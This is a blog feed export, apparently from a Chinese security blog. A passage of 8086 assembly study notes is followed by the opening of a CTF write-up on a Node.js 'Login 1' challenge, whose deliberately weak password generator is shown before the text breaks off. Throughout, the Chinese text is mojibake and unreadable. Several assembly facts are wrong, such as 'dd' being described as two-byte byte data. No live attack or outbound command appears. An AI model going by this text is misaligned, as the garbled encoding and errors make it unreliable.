ç”¨16ä¸ªå­—èŠ‚çš„å†…å­˜ç©ºé—´ã€‚å–ç”¨æ—¶ä»cså»çš„æ®µåœ°å€ï¼Œ<code>dw</code>æœ€å…ˆå®šä¹‰æ‰€ä»¥æ®µåç§»ä¸º0ï¼Œä¹‹åbxåŠ 2æ“ä½œè¿›è¡Œè¿ç»­å–ç”¨ã€‚</p><p><code>end</code>é™¤äº†é€šçŸ¥ç¼–è¯‘å™¨ç¨‹åºç»“æŸå¤–ï¼Œè¿˜å¯ä»¥å‘Šè¯‰ç¼–è¯‘å™¨ç¨‹åºçš„å…¥å£åœ¨ä»€ä¹ˆåœ°æ–¹ã€‚</p><h2 id="ä¸‰ã€æ›´çµæ´»çš„å®šä½å†…å­˜åœ°å€çš„æ–¹æ³•"><a href="#ä¸‰ã€æ›´çµæ´»çš„å®šä½å†…å­˜åœ°å€çš„æ–¹æ³•" class="headerlink" title="ä¸‰ã€æ›´çµæ´»çš„å®šä½å†…å­˜åœ°å€çš„æ–¹æ³•"></a>ä¸‰ã€æ›´çµæ´»çš„å®šä½å†…å­˜åœ°å€çš„æ–¹æ³•</h2><h3 id="0-ä¸ƒç§å¯»å€æ–¹å¼"><a href="#0-ä¸ƒç§å¯»å€æ–¹å¼" class="headerlink" title="0.ä¸ƒç§å¯»å€æ–¹å¼"></a>0.ä¸ƒç§å¯»å€æ–¹å¼</h3><p>å¯»å€æ–¹å¼: æŒ‡ä»¤ä¸­æŒ‡æ˜æ“ä½œæ•°å­˜æ”¾ä½ç½®çš„è¡¨è¾¾æ–¹å¼ã€‚</p><p>å¯»å€æ–¹å¼å¯ä»¥åˆ†ä¸º:</p><pre><code>ç«‹å³æ•°å¯»å€æ–¹å¼(å­˜æ”¾åœ¨æŒ‡ä»¤å½“ä¸­)mov AL,10H--&gt;ç«‹å³æ•°(åªèƒ½æ˜¯æºæ“ä½œæ•°ï¼Œå³å¯„å­˜å™¨æˆ–è€…å­˜å‚¨å™¨)å¯„å­˜å™¨å¯»å€æ–¹å¼(å­˜äºå¯„å­˜å™¨ä¸­)inc cx;åŠ 1dec cs;å‡1mov ax,bxå­˜å‚¨å™¨å¯»å€æ–¹å¼(å­˜æ”¾äºå­˜å‚¨å™¨ä¹‹ä¸­)||    mov ax,[25000H]--&gt;å­˜å‚¨å™¨æ“ä½œæ•°||-&gt;  ç›´æ¥å¯»å€æ–¹å¼||-&gt;  å¯„å­˜å™¨é—´æ¥å¯»å€æ–¹å¼||-&gt;  å¯„å­˜å™¨ç›¸å¯¹å¯»å€æ–¹å¼||-&gt;  åŸºå€åŠ å˜å€å¯»å€æ–¹å¼||-&gt;  ç›¸å¯¹åŠ åŸºå€å˜å€å¯»å€æ–¹å¼</code></pre><p><a href="https://i.loli.net/2018/11/11/5be7ef97a7d74.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/11/5be7ef97a7d74.png" alt="å±å¹•å¿«ç…§ 2018-11-11 ä¸‹åˆ4.59.54.png"></a></p><h3 id="1-andå’ŒoræŒ‡ä»¤"><a href="#1-andå’ŒoræŒ‡ä»¤" class="headerlink" title="1.andå’ŒoræŒ‡ä»¤"></a>1.andå’ŒoræŒ‡ä»¤</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;å¯ä»¥å°†æ“ä½œå¯¹è±¡çš„ç›¸åº”ä½è®¾ä¸º0ï¼Œå…¶å®ƒä½ä¿æŒä¸å˜</span><br><span class="line">and a1,11111110B</span><br><span class="line"></span><br><span class="line">;å¯ä»¥å°†æ“ä½œå¯¹è±¡çš„ç›¸åº”ä½è®¾ä¸º1ï¼Œå…¶å®ƒä½ä¿æŒä¸å˜</span><br><span class="line">or a1,00000001B</span><br></pre></td></tr></table></figure><h3 id="2-ASCII"><a href="#2-ASCII" class="headerlink" title="2.ASCII"></a>2.ASCII</h3><p>aå­—ç¬¦â€“&gt;61Hå­˜å‚¨åœ¨æŒ‡å®šç©ºé—´ä¸­<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">;ä½¿ç”¨&apos;......&apos;æŒ‡æ˜æ•°æ®æ˜¯ä»¥å­—ç¬¦çš„å½¢å¼ç»™å‡ºçš„</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">    db &apos;unIX&apos;</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">;æ³¨æ„:å°å†™å­—æ¯çš„ASCIIç å€¼æ¯”å¤§å†™å­—æ¯çš„ASCIIç å€¼å¤§20H</span><br></pre></td></tr></table></figure></p><h3 id="3-æŒ‡ä»¤å¤„ç†æ•°æ®çš„é•¿åº¦"><a href="#3-æŒ‡ä»¤å¤„ç†æ•°æ®çš„é•¿åº¦" class="headerlink" title="3.æŒ‡ä»¤å¤„ç†æ•°æ®çš„é•¿åº¦"></a>3.æŒ‡ä»¤å¤„ç†æ•°æ®çš„é•¿åº¦</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;ä¸€ä¸ªå­—å•å…ƒ</span><br><span class="line">mov word ptr ds:[0],1</span><br><span class="line">;ä¸€ä¸ªå­—èŠ‚å•å…ƒ</span><br><span class="line">mov byte ptr ds:[0],1</span><br></pre></td></tr></table></figure><h3 id="4-ä¼ªæŒ‡ä»¤dd"><a href="#4-ä¼ªæŒ‡ä»¤dd" class="headerlink" title="4.ä¼ªæŒ‡ä»¤dd"></a>4.ä¼ªæŒ‡ä»¤dd</h3><p>dd-&gt;å­—èŠ‚å‹æ•°æ®<br>dw-&gt;å­—å‹æ•°æ®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">;æ•°æ®ä¸º01Hï¼Œåœ¨data:0å¤„ï¼Œå 1ä¸ªå­—èŠ‚</span><br><span class="line">    db 1</span><br><span class="line">;æ•°æ®ä¸º0001Hï¼Œåœ¨data:1å¤„ï¼Œå 1ä¸ªå­—</span><br><span class="line">    dw 1</span><br><span class="line">;æ•°æ®ä¸º00000001Hï¼Œåœ¨data:2å¤„ï¼Œå 2ä¸ªå­—èŠ‚</span><br><span class="line">    dd 1</span><br><span class="line">data ends</span><br></pre></td></tr></table></figure><h3 id="5-dup"><a href="#5-dup" class="headerlink" title="5.dup"></a>5.dup</h3><p>dupé…åˆdb,dw,ddè¿›è¡Œæ•°æ®é‡å¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;db é‡å¤çš„æ¬¡æ•° dup (é‡å¤çš„å­—èŠ‚å‹æ•°æ®)</span><br><span class="line">db 3 dup (0,1,2)</span><br><span class="line">;å®šä¹‰äº†9ä¸ªå­—èŠ‚</span><br><span class="line">;ç›¸å½“äºdb 0,1,2,0,1,2,0,1,2</span><br></pre></td></tr></table></figure><h2 id="å››ã€è½¬ç§»æŒ‡ä»¤çš„åŸç†"><a href="#å››ã€è½¬ç§»æŒ‡ä»¤çš„åŸç†" class="headerlink" title="å››ã€è½¬ç§»æŒ‡ä»¤çš„åŸç†"></a>å››ã€è½¬ç§»æŒ‡ä»¤çš„åŸç†</h2><p>å¯ä»¥ä¿®æ”¹IPï¼Œæˆ–åŒæ—¶ä¿®æ”¹CSå’ŒIPçš„æŒ‡ä»¤ç»Ÿç§°ä¸ºè½¬ç§»æŒ‡ä»¤ã€‚</p><h3 id="1-æ“ä½œç¬¦-offset"><a href="#1-æ“ä½œç¬¦-offset" class="headerlink" title="1.æ“ä½œç¬¦ offset"></a>1.æ“ä½œç¬¦ offset</h3><p><code>offset</code> å¯ä»¥å–å¾—æ ‡å·çš„åç§»åœ°å€</p><h3 id="2-jmpæŒ‡ä»¤"><a href="#2-jmpæŒ‡ä»¤" class="headerlink" title="2.jmpæŒ‡ä»¤"></a>2.jmpæŒ‡ä»¤</h3><p><code>jmp</code>ä¸ºæ— æ¡ä»¶è½¬ç§»æŒ‡ä»¤ï¼Œå¯ä»¥åªä¿®æ”¹IPï¼Œä¹Ÿå¯ä»¥åŒæ—¶ä¿®æ”¹CSå’ŒIP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;è½¬åˆ°æ ‡å·å¤„æ‰§è¡Œå‘½ä»¤,è¿™ä¸ªæ˜¯</span><br><span class="line">jmp short æ ‡å·</span><br><span class="line">;æ®µé—´è½¬ç§»</span><br><span class="line">jmp far ptr æ ‡å·</span><br></pre></td></tr></table></figure><h3 id="3-jcxzæŒ‡ä»¤"><a href="#3-jcxzæŒ‡ä»¤" class="headerlink" title="3.jcxzæŒ‡ä»¤"></a>3.jcxzæŒ‡ä»¤</h3><p><code>jcxz</code>æ¡ä»¶è½¬ç§»æŒ‡ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jcxz æ ‡å·</span><br></pre></td></tr></table></figure><h3 id="4-loopæŒ‡ä»¤"><a href="#4-loopæŒ‡ä»¤" class="headerlink" title="4.loopæŒ‡ä»¤"></a>4.loopæŒ‡ä»¤</h3><p>loopæŒ‡ä»¤ä¸ºå¾ªç¯æŒ‡ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loop æ ‡å·</span><br></pre></td></tr></table></figure><h3 id="5-inæŒ‡ä»¤"><a href="#5-inæŒ‡ä»¤" class="headerlink" title="5.inæŒ‡ä»¤"></a>5.inæŒ‡ä»¤</h3><p>ç”¨äºCPUä»å¤–è®¾ç«¯å£æ¥æ”¶æ•°æ®</p><h3 id="6-outè¾“å‡ºæŒ‡ä»¤"><a href="#6-outè¾“å‡ºæŒ‡ä»¤" class="headerlink" title="6.outè¾“å‡ºæŒ‡ä»¤"></a>6.outè¾“å‡ºæŒ‡ä»¤</h3><p>ç”¨äºCPUå‘å¤–è®¾ç«¯å£å‘é€æ•°æ®</p><h3 id="7-xchgäº¤æ¢æŒ‡ä»¤"><a href="#7-xchgäº¤æ¢æŒ‡ä»¤" class="headerlink" title="7.xchgäº¤æ¢æŒ‡ä»¤"></a>7.xchgäº¤æ¢æŒ‡ä»¤</h3><h3 id="8-åœ°å€ä¼ é€æŒ‡ä»¤-LEA-amp-LDS-amp-LES"><a href="#8-åœ°å€ä¼ é€æŒ‡ä»¤-LEA-amp-LDS-amp-LES" class="headerlink" title="8.åœ°å€ä¼ é€æŒ‡ä»¤:LEA &amp; LDS &amp; LES"></a>8.åœ°å€ä¼ é€æŒ‡ä»¤:LEA &amp; LDS &amp; LES</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;reg16--16ä½é€šç”¨å¯„å­˜å™¨</span><br><span class="line">;mem--å­˜å‚¨å•å…ƒ</span><br><span class="line">LEA reg16,mem</span><br></pre></td></tr></table></figure><h3 id="9-æ ‡å¿—ä¼ é€æŒ‡ä»¤-LAHF-amp-SAHF-amp-PUSHF-amp-POPF"><a href="#9-æ ‡å¿—ä¼ é€æŒ‡ä»¤-LAHF-amp-SAHF-amp-PUSHF-amp-POPF" class="headerlink" title="9.æ ‡å¿—ä¼ é€æŒ‡ä»¤:LAHF &amp; SAHF &amp; PUSHF &amp; POPF"></a>9.æ ‡å¿—ä¼ é€æŒ‡ä»¤:LAHF &amp; SAHF &amp; PUSHF &amp; POPF</h3><h2 id="äº”ã€ç®—æ•°è¿ç®—æŒ‡ä»¤çš„åŸç†"><a href="#äº”ã€ç®—æ•°è¿ç®—æŒ‡ä»¤çš„åŸç†" class="headerlink" title="äº”ã€ç®—æ•°è¿ç®—æŒ‡ä»¤çš„åŸç†"></a>äº”ã€ç®—æ•°è¿ç®—æŒ‡ä»¤çš„åŸç†</h2><h3 id="1-åŠ æ³•æŒ‡ä»¤"><a href="#1-åŠ æ³•æŒ‡ä»¤" class="headerlink" title="1.åŠ æ³•æŒ‡ä»¤"></a>1.åŠ æ³•æŒ‡ä»¤</h3><p>â€¢ ADD(Addition) åŠ æ³•æŒ‡ä»¤</p><p>â€¢ ADC(Add withCarry)å¸¦è¿›ä½åŠ æ³•æŒ‡ä»¤</p><p>â€¢ INC(Increment)åŠ  1æŒ‡ä»¤</p><p>â€¢ AAA(ASCIIadjustforaddition)åŠ æ³•ASCIIè°ƒæ•´æŒ‡ä»¤</p><p>â€¢ DAA(Decimaladjustforaddition)åŠ æ³•åè¿›åˆ¶è°ƒæ•´æŒ‡ä»¤</p><h3 id="2-å‡æ³•æŒ‡ä»¤"><a href="#2-å‡æ³•æŒ‡ä»¤" class="headerlink" title="2.å‡æ³•æŒ‡ä»¤"></a>2.å‡æ³•æŒ‡ä»¤</h3><p>8086æœ‰7æ¡å‡æ³•æŒ‡ä»¤:</p><p>â€¢ SUB(Subtraction)å‡æ³•æŒ‡ä»¤</p><p>â€¢ SBB(SubtractionwithBorrow)è¿›ä½å‡æ³•æŒ‡ä»¤</p><p>â€¢ DEC(Decrement by 1)å‡1æŒ‡ä»¤</p><p>â€¢ NEG(Negate) æ±‚è¡¥æŒ‡ä»¤</p><p>â€¢ CMP(Compare)æ¯”è¾ƒæŒ‡ä»¤</p><p>â€¢ AAS(ASCII Adjust for Subtraction) å‡æ³•ASCIIè°ƒæ•´æŒ‡ä»¤</p><p>â€¢ DAS(Decimal Adjust for Subtraction) å‡æ³•åè¿›åˆ¶è°ƒæ•´æŒ‡ä»¤</p><h3 id="3-ä¹˜æ³•æŒ‡ä»¤"><a href="#3-ä¹˜æ³•æŒ‡ä»¤" class="headerlink" title="3. ä¹˜æ³•æŒ‡ä»¤"></a>3. ä¹˜æ³•æŒ‡ä»¤</h3><p>1ï¼‰æ— ç¬¦å·ä¹˜æ³•ï¼ˆMULï¼‰</p><p>2ï¼‰å¸¦ç¬¦å·ä¹˜æ³•ï¼ˆIMULï¼‰</p><h3 id="4-é™¤æ³•æŒ‡ä»¤"><a href="#4-é™¤æ³•æŒ‡ä»¤" class="headerlink" title="4.é™¤æ³•æŒ‡ä»¤"></a>4.é™¤æ³•æŒ‡ä»¤</h3><p>1ï¼‰æ— ç¬¦å·é™¤æ³•ï¼ˆDIVï¼‰</p><p>2ï¼‰å¸¦ç¬¦å·é™¤æ³•ï¼ˆIDIVï¼‰</p><p>3ï¼‰å­—èŠ‚æ‰©å±•æŒ‡ä»¤ï¼ˆCBWï¼‰</p><p>4ï¼‰å­—æ‰©å±•æŒ‡ä»¤ï¼ˆCWDï¼‰ </p><h3 id="5-åè¿›åˆ¶è°ƒæ•´æŒ‡ä»¤"><a href="#5-åè¿›åˆ¶è°ƒæ•´æŒ‡ä»¤" class="headerlink" title="5.åè¿›åˆ¶è°ƒæ•´æŒ‡ä»¤"></a>5.åè¿›åˆ¶è°ƒæ•´æŒ‡ä»¤</h3><p>å…±å…­æ¡</p><p>â€¢ AAAéå‹ç¼©BCDç çš„åŠ æ³•åè¿›åˆ¶è°ƒæ•´</p><p>â€¢ DAAå‹ç¼©BCDç çš„åŠ æ³•åè¿›åˆ¶è°ƒæ•´</p><p>â€¢ AASéå‹ç¼©BCDç çš„å‡æ³•åè¿›åˆ¶è°ƒæ•´</p><p>â€¢ DASå‹ç¼©BCDç çš„å‡æ³•åè¿›åˆ¶è°ƒæ•´</p><p>â€¢ AAMä¹˜æ³•çš„åè¿›åˆ¶è°ƒæ•´</p><p>â€¢ AADé™¤æ³•çš„åè¿›åˆ¶è°ƒæ•´</p><h2 id="å…­ã€é€»è¾‘è¿ç®—å’Œç§»ä½æŒ‡ä»¤"><a href="#å…­ã€é€»è¾‘è¿ç®—å’Œç§»ä½æŒ‡ä»¤" class="headerlink" title="å…­ã€é€»è¾‘è¿ç®—å’Œç§»ä½æŒ‡ä»¤"></a>å…­ã€é€»è¾‘è¿ç®—å’Œç§»ä½æŒ‡ä»¤</h2><p>é’ˆå¯¹äºŒè¿›åˆ¶0/1è¿›è¡Œçš„æ“ä½œ</p><h3 id="1-é€»è¾‘è¿ç®—æŒ‡ä»¤"><a href="#1-é€»è¾‘è¿ç®—æŒ‡ä»¤" class="headerlink" title="1.é€»è¾‘è¿ç®—æŒ‡ä»¤"></a>1.é€»è¾‘è¿ç®—æŒ‡ä»¤</h3><p>â€¢ ANDé€»è¾‘â€œä¸â€æŒ‡ä»¤(æœ‰0åˆ™0)</p><p>â€¢ TESTæµ‹è¯•æŒ‡ä»¤(åªæ”¹å˜æ ‡å¿—ä½)</p><p>â€¢ ORé€»è¾‘â€œæˆ–â€æŒ‡ä»¤(æœ‰1åˆ™1)</p><p>â€¢ XORï¼ˆexclusive OR)é€»è¾‘â€œå¼‚æˆ–â€æŒ‡ä»¤(ç›¸åŒä¸º0ï¼Œä¸åŒä¸º1)</p><p>â€¢ NOTé€»è¾‘â€œéâ€æŒ‡ä»¤(ä¸èƒ½æ˜¯ç«‹å³æ•°)</p><h3 id="2-ç§»ä½æŒ‡ä»¤"><a href="#2-ç§»ä½æŒ‡ä»¤" class="headerlink" title="2.ç§»ä½æŒ‡ä»¤"></a>2.ç§»ä½æŒ‡ä»¤</h3><p>â€¢ SAL (Shift Arithmetic Left)ç®—æœ¯å·¦ç§»(æ— ç¬¦å·æ•°ä¹˜2ï¼Œæœ€é«˜ä½è¿›CL)</p><p>â€¢ SAR (Shiftarithmeticright)ç®—æœ¯å³ç§»(æ— ç¬¦å·æ•°é™¤2ï¼Œæœ€ä½ä½è¿›CF)</p><p>â€¢ SHL (Shift logical left)é€»è¾‘å·¦ç§»(æœ€ä½ä½ä¸å˜ï¼Œ)</p><p>â€¢ SHR (Shiftlogicalright)é€»è¾‘å³ç§»(æœ€é«˜ä½ä¸å˜ï¼Œä½ä½ç§»å…¥CF)</p><p>â€¢ ROL (Rotateleft)å¾ªç¯å·¦ç§»</p><p>â€¢ ROR (Rotateright)å¾ªç¯å³ç§»</p><p>â€¢ RCL (Rotateleftwith carry)å¸¦è¿›ä½å¾ªç¯å·¦ç§»(å°±æ˜¯å¾ªç¯æ—¶æ˜¯å¸¦CFçš„)</p><p>â€¢ RCR (Rotateright withcarry)å¸¦è¿›ä½å¾ªç¯å³ç§»</p><h2 id="ä¸ƒã€ä¸²æ“ä½œç±»æŒ‡ä»¤"><a href="#ä¸ƒã€ä¸²æ“ä½œç±»æŒ‡ä»¤" class="headerlink" title="ä¸ƒã€ä¸²æ“ä½œç±»æŒ‡ä»¤"></a>ä¸ƒã€ä¸²æ“ä½œç±»æŒ‡ä»¤</h2><p>â€¢ â€œä¸²â€å°±æ˜¯å†…å­˜ä¸­ä¸€æ®µåœ°å€ç›¸è¿çš„<strong>å­—èŠ‚Bæˆ–å­—W</strong>ï¼›</p><p>â€¢ ä¸²æ“ä½œï¼Œä¹Ÿå«æ•°æ®å—æ“ä½œï¼›</p><p>â€¢ å¯å®ç°å­˜å‚¨å™¨æ•°æ®é—´çš„ç›´æ¥ä¼ é€ï¼›</p><p>â€¢ 8086æœ‰5ç§åŸºæœ¬ä¸²æ“ä½œï¼š</p><p>MOVSï¼ˆMove stringï¼‰ä¸²ä¼ é€æŒ‡ä»¤</p><p>CMPSï¼ˆCompare stringï¼‰ä¸²æ¯”è¾ƒæŒ‡ä»¤</p><p>SCASï¼ˆScan stringï¼‰ä¸²æ‰«ææŒ‡ä»¤</p><p>LODSï¼ˆLoad from stringï¼‰å–ä¸²æŒ‡ä»¤</p><p>STOS ï¼ˆStore in to stringï¼‰å­˜ä¸²æŒ‡ä»¤</p><h3 id="1-æ ‡å¿—å¤„ç†æŒ‡ä»¤"><a href="#1-æ ‡å¿—å¤„ç†æŒ‡ä»¤" class="headerlink" title="1.æ ‡å¿—å¤„ç†æŒ‡ä»¤"></a>1.æ ‡å¿—å¤„ç†æŒ‡ä»¤</h3><p>â€¢ CLC ï¼ˆClearcarryflag)æ¸…Cæ ‡å¿—</p><p>â€¢ STCï¼ˆSetcarryflag )ç½®Cæ ‡å¿—</p><p>â€¢ CMCï¼ˆComplementcarryflagï¼‰å¯¹Cæ±‚å</p><p>â€¢ CLDï¼ˆCleardirectionflag)æ¸…Dæ ‡å¿—</p><p>â€¢ STDï¼ˆSetdirectionflag)ç½®Dæ ‡å¿—</p><p>â€¢ CLIï¼ˆClearinterruptflag)æ¸…Iæ ‡å¿—</p><p>â€¢ STI ï¼ˆSetinterruptenableflag)ç½®Iæ ‡å¿—</p><h3 id="2-å…¶ä»–å¤„ç†æœºæ§åˆ¶æŒ‡ä»¤"><a href="#2-å…¶ä»–å¤„ç†æœºæ§åˆ¶æŒ‡ä»¤" class="headerlink" title="2.å…¶ä»–å¤„ç†æœºæ§åˆ¶æŒ‡ä»¤"></a>2.å…¶ä»–å¤„ç†æœºæ§åˆ¶æŒ‡ä»¤</h3><p>â€¢ NOPï¼ˆNooperation)ç©ºæ“ä½œ</p><p>â€¢ HLTï¼ˆHalt) CPUæš‚åœçŠ¶æ€</p><p>â€¢ WAITCPUç­‰å¾…çŠ¶æ€</p><p>â€¢ ESCäº¤æƒ</p><p>â€¢ LOCKï¼ˆLockbus)æ€»çº¿é”å®š</p><h2 id="å…«ã€opcode"><a href="#å…«ã€opcode" class="headerlink" title="å…«ã€opcode"></a>å…«ã€opcode</h2><p>æ“ä½œç (Operation Code, OPCode) æè¿°æœºå™¨è¯­è¨€æŒ‡ä»¤ä¸­ï¼ŒæŒ‡å®šè¦æ‰§è¡ŒæŸç§æ“ä½œçš„æœºå™¨ç ã€‚</p><p>OPCodeåœ¨ä¸åŒçš„åœºåˆä¸­é€šå¸¸å…·æœ‰ä¸åŒçš„å«ä¹‰ï¼Œä¾‹å¦‚PHPè™šæ‹Ÿæœº(Zend VM)ã€javaè™šæ‹Ÿæœº(JVM)</p><p>ä»¥åŠä¸€äº›è½¯ä»¶ä¿æŠ¤è™šæ‹Ÿæœºä¸­çš„æœ€å°æ“ä½œå•å…ƒéƒ½å¯ä»¥ç§°ä¹‹ä¸ºOPCodeã€‚</p><h2 id="ä¹ã€å‚è€ƒ"><a href="#ä¹ã€å‚è€ƒ" class="headerlink" title="ä¹ã€å‚è€ƒ"></a>ä¹ã€å‚è€ƒ</h2><p><a href="https://www.kanxue.com/book-31.htm" target="_blank" rel="noopener">https://www.kanxue.com/book-31.htm</a></p><p>ã€Šæ±‡ç¼–è¯­è¨€(ç¬¬3ç‰ˆ)ã€‹ç‹çˆ½è‘—</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ä¸€ã€åŸºç¡€æ¦‚å¿µ&quot;&gt;&lt;a href=&quot;#ä¸€ã€åŸºç¡€æ¦‚å¿µ&quot; class=&quot;headerlink&quot; title=&quot;ä¸€ã€åŸºç¡€æ¦‚å¿µ&quot;&gt;&lt;/a&gt;ä¸€ã€åŸºç¡€æ¦‚å¿µ&lt;/h2&gt;&lt;h3 id=&quot;0-æ±‡ç¼–åŸºç¡€&quot;&gt;&lt;a href=&quot;#0-æ±‡ç¼–åŸºç¡€&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>P.W.N. CTF Writeup</title>
    <link href="http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/"/>
    <id>http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/</id>
    <published>2018-11-02T10:33:15.000Z</published>
    <updated>2018-11-13T15:25:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Login-Sec"><a href="#Login-Sec" class="headerlink" title="Login Sec"></a>Login Sec</h1><p><strong>Login 1</strong>çš„ä»£ç å¦‚ä¸‹:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _0x86d1=[<span class="string">"\x68\x65\x78"</span>,<span class="string">"\x72\x61\x6E\x64\x6F\x6D\x42\x79\x74\x65\x73"</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePart1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">         &#123;</span><br><span class="line">             x: crypto[_0x86d1[<span class="number">1</span>]](<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">         &#125;[x].toString(_0x86d1[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePart2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/html'</span>&#125;);</span><br><span class="line">    passwd = generatePart1() + generatePart2();</span><br><span class="line">    <span class="keyword">var</span> url_content = url.parse(req.url, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (passwd == url_content.query.passwd) &#123;</span><br><span class="line">       res.write(fs.readFileSync(<span class="string">'flag.txt'</span>, <span class="string">'utf8'</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.write(<span class="string">'&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.end();</span><br><span class="line">&#125;).listen(<span class="number">8888</span>);</span><br></pre></td></tr></table></figure><p>æˆ‘åœ¨æ­¤å°†å…¶ç®€åŒ–ä¸€ä¸‹ï¼Œæ–¹ä¾¿æœ¬åœ°è¿è¡Œã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _0x86d1=[<span class="string">"\x68\x65\x78"</span>,<span class="string">"\x72\x61\x6E\x64\x6F\x6D\x42\x79\x74\x65\x73"</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePart1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">                 &#123;</span><br><span class="line">                         x: crypto[_0x86d1[<span class="number">1</span>]](<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">                 &#125;[x].toString(_0x86d1[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePart2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    passwd = generatePart1() + generatePart2();</span><br><span class="line">    <span class="built_in">console</span>.log(passwd)</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœä¸º:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> zeroyu@zeros î‚° ~/Desktop î‚° node login.js</span><br><span 